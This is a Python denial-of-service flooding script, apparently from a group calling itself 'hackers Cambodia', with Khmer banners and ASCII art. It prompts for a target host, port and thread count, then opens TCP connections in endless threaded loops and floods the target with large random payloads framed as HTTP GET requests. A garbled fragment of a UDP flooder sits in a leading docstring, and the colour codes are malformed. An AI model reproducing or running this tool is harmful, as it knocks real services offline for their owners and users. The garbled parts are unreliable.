
"""import socket, threading, os, sys, random, ctypes, time

delay=200000000000000
psc=50000000000000000
ux=2000000
port = 1000000
sent = 00000000
id=100000ឪឪ
svc=[]



sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
if os.name=='nt':
    os.system('color b')
    os.system('title Ẹras v7')
    ctypes.windll.kernel32.SetConsoleTitleW('Ẹras v7')
else:
    os.system('setterm -background white -foreground white -store')

def cls():
    os.system('cls' if os.name=='nt' else 'clear')
cls()

def type(text):
  words = text
  for char in words:
    time.sleep(0.08)
    sys.stdout.write(char)
    sys.stdout.flush()
    
/*
 * 
 * 
 *Free code 
print("ព្រះយើងគឺជាមាតាបិតា")
print(" យើងជាមនុស្សយើងត្រូវដឹងអំពីសេចក**ីល្អ។")
input("សូមរងចាំ......ចុចវាដើម្បីដំណើរការ")
print("👩‍💻🌏🪐hackers Cambodia🌹")
print("ខ្ញុំជាកូនល្អសម្រាប់មាតាបិតា")
type("││ {====>ddos [ក្រុមយើងមានម៉ាជិត៣អ្នក] |: target ip")
print()
ip = input("││ :")
ipp=ip
target=ip
  * 
  * 
 *  
 
"""

import socket
import time
import os
import random

from threading import Thread

os.system("clear")

if not __name__ == "__main__":
    exit()
      
class ConsoleColors:
    HEADER = '\066[10m'
    OKBLUE = '\066[10mm'
    OKGREEN = '\066[10m'
    WARNING = '\066[10m'
    FAIL = '\066[m'
    BOLD = '\066[1m'
    
print(ConsoleColors.BOLD + ConsoleColors.WARNING + '''
            
            
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠛⠉⣉⣉⣉⣉⣉⣉⣉⡩⠙⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⡿⠟⢋⣡⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣄⣉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⣡⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⣁⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠋⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ Cambodia​ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠟⢡⣾⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣆⠙⢿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠃⣴⣿⣿⣿⡿⠛⠁⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠈⠙⠿⣿⣿⣿⣷⡀⠻⣿⣿⣿⣿⣿
⣿⣿⣿⡿⢁⣾⣿⠟⢁⡾⠁⢀⢴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⡀⠹⣆⠙⣿⣿⡄⠹⣿⣿⣿⣿
⣿⣿⡿⢁⣾⡿⡏⠀⣼⣁⡴⢫⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⠀⣿⡆⠀⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢳⣄⣹⡀⠘⡿⣿  ⣿⣿⣿⣿
⣿⣿⠁⣾⡟⢹⡇⢠⠟⠉⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣡⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡈⠙⢇⠀⣿⠹⣿⡀⢻⣿⣿
⣿⡇⢸⣿⠂⢸⡇⠀⣠⡞⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠶⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡛⣦⡀⠀⣿⠀⢿⣧⠀⣿⣿
⢿⠀⣾⣿⠀⢸⣧⠞⠁⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡈⠙⢦⣿⠀⢸⣿⡄⢸⣿
⡇⢠⣿⢻⡄⠘⠁⢀⡴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠋⠀⣶⢻⡇⠀⣿
⡁⢸⡏⠘⣇⠀⢰⡟⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⣿⣬⡉⣉⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠹⣦⠀⢠⡏⢘⣿⠀⣿
⠇⢸⣏⠀⢹⣆⠟⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠛⠉⠀⢰⣿⣟⡅⣝⣿⣿⠀⠈⠛⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠘⣇⣾⠁⢸⣿⠀⣿
⠀⢸⣿⡄⠈⣿⠀⢀⣏⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⢺⣿⣿⡇⢻⣿⣿⠀⠀⠀⠀⠀⠀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⢹⠏⠀⣾⣿⠀⣿
⡇⠘⣿⢷⡀⠈⠀⣼⠏⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠸⣿⡿⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠇⢿⡀⠘⠀⣼⢿⡇⠀⣿
⣿⠀⢿⡈⠻⣆⠀⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⠀⠀⣿⠃⠀⠀⠀.  ⠀⠈⢐⣿⣿⣿⣿⣿⣿⣿⠀⢸⡇⢠⡾⠋⣸⠃⢸⣿⣿
⣿⡇⢸⣧⠀⠈⢷⡏⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⡏⠀⢘⣷⠋⠀⣰⡟⠀⣿⣿
⣿⣿⡀⢻⣧⡀⠀⠙⠀⠐⣧⠹⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⢱⡇⠀⠜⠁⢀⣰⣿⠁⣸⣿⣿
⣿⣿⣷⡈⢿⡙⠳⣤⣀⠀⢿⡀⠹⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡿⠀⢾⠃⢀⣠⠶⠋⣽⠃⣰⣿⣿⣿
⣿⣿⣿⣷⡈⢷⣄⠀⠉⠛⢾⣇⠀⠹⣞⢿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠁⢠⣿⠞⠋⠁⢀⣾⠋⣰⣿⣿⣿⣿
⣿⣿⣿⣿⣷⡀⠻⣷⡦⣀⡀⠈⠃⠀⠙⣆⠉⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⡞⠁⠀⠉⠀⣀⡤⣶⡿⠁⣰⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣆⠘⢿⣌⠙⠳⠶⠦⣤⣼⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣯⣤⣴⠶⠶⠛⢉⣾⠏⢀⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣷⣄⠙⢿⣦⣤⣀⣀⣀⣀⣠⣤⣤⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣦⣠⣤⣀⣀⣀⣀⣠⣤⣾⠟⢁⣴⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡉⠻⣦⣉⠙⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⢉⣩⠾⠋⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠉⠻⢶⣶⣶⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣶⣶⣶⣶⠞⠋⢁⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣈⡙⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠟⠋⣉⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣤⣀⣀⣀⣀⣀⣀⣀⣀⣀⣠⣤⣴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                        🙏ខ្ញុំ​ស្រលាញ់​ប្រទេស​កម្ពុជា🙏
             ''')
    
def getport():
    try:
        p = int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Port:\r\n"))
        return p
    except ValueError:
        print(ConsoleColors.BOLD + ConsoleColors.WARNING + "ERROR Port must be a number, Set Port to default " + ConsoleColors.OKGREEN + "80")
        return 80

host = input(ConsoleColors.BOLD + ConsoleColors.OKBLUE + "ផ្ទះ​:\r\n")
port = getport()
speedPerRun = int(input(ConsoleColors.BOLD + ConsoleColors.HEADER + "Hits Per Run:\r\n"))
threads = int(input(ConsoleColors.BOLD + ConsoleColors.WARNING + "Thread Count:\r\n"))

ip = socket.gethostbyname(host)

bytesToSend = random._urandom(24599)

i = 0;



class Count:
    packetCounter = 0 

def goForDosThatThing():
    try:
        while True:
            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                dosSocket.connect((ip, port))
                for i in range(speedPerRun):
                    try:
                        dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                        dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "-----< PACKET " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + " SUCCESSFUL SENT AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " >-----")
                        Count.packetCounter = Count.packetCounter + 1
                    except socket.error:
                        print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
                    except KeyboardInterrupt:
                        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
            except socket.error:
                print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
            except KeyboardInterrupt:
                print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
            dosSocket.close()
    except KeyboardInterrupt:
        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
try:
        
    print(ConsoleColors.BOLD + ConsoleColors.OKBLUE + '''
                                                          
        
⣿⡿⠋⠉⠀⠀⠈⢉⡛⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢛⡉⠀⠀⠀⠀⠉⠻⣿⣿:
⣿⡟⢀⣀⣀⣀⡀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⢀⣀⣀⣀⣀⠙⣿
⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⢀⣹⣿⣿⣿⣿⣏⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠿⠛⢛⣻⡛⠿⢷⡀⢻⣿⣿⣿⣿⡟⢠⡾⠟⢛⣟⣛⡛⠿⣿⣿⣿⣿
⣯⡻⠿⠃⡀⠁⠀⠀⠀⠈⠀⠹⣾⢹⣿⣿⡏⣷⡇⠀⠁⠀⠀⠀⠈⢑⠘⠿⢟⣿
⣏⣤⣶⣦⣤⣉⣉⣰⣈⣤⣴⣾⡟⢸⣿⣿⡇⢻⣷⣤⣤⣀⣆⣀⣉⣥⣴⣶⣤⣹
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⢸⣿⣿⡇⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣡⡄⣸⣿⣿⣧⢠⣌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣏⠻⢿⣿⣿⠿⠟⢛⣡⣟⣾⣿⡇⣿⣿⣿⣿⢸⣿⣧⣻⣌⡛⠿⠿⣿⣿⠿⠟⣿
⣿⡄⠰⡄⠐⢶⣿⣿⣿⣿⣿⣭⡱⠬⣉⣉⠡⢎⣭⣿⣿⣿⣿⣿⡶⠂⢠⠆⢠⣿
⣿⣿⡄⠹⣆⠀⠹⠿⠿⠿⠿⠋⠀⠀⣠⣄⠀⠀⠙⠿⠿⠿⠿⠏⠀⣠⠏⢠⣿⣿
⣿⣿⣿⣄⠘⢧⣄⣀⣀⣀⣀⠀⠀⠼⠿⠿⠦⠀⠀⣀⣀⣀⣀⣠⡼⠋⣠⣿⣿⣿
⣿⣿⣿⣿⣦⠑⣯⣛⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣛⣵⢊⣴⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣷⣌⢿⣿⣿⣿⣿⣿⣍⠉⠉⣩⣿⣿⣿⣿⣿⡿⣣⣾⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⡿⠀⠀⢿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
              វាយប្រហារ​
   ''')
    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [                    ] 0% ")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [=====    🇰🇭           ] 25%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [==========     🇰🇭     ] 50%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [=============== 🇰🇭     ] 75%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "LOADING >> [====================] 100%")
    
    for i in range(threads):
        try:
            t = Thread(target=goForDosThatThing)
            t.start()
        except KeyboardInterrupt:
            print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")    
except KeyboardInterrupt:
    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
    